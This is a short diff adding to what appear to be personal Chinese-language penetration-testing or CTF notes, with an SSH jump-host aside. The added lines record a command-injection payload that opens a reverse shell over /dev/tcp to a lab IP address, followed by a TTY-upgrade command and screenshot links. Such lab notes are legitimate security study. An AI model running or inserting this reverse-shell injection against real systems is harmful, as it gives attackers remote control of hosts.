@@ -27,3 +27,13 @@ username: root
 
 带有username和host的是`[-J [user@]host[:port]]`
 
+```
+;`(sh)0>/dev/tcp/10.10.16.8/9999`
+exec >&0
+```
+![](attachments/Pasted%20image%2020230910164753.png)
+
+script /dev/null -c bash 美化
+
+![](attachments/Pasted%20image%2020230910164957.png)
+
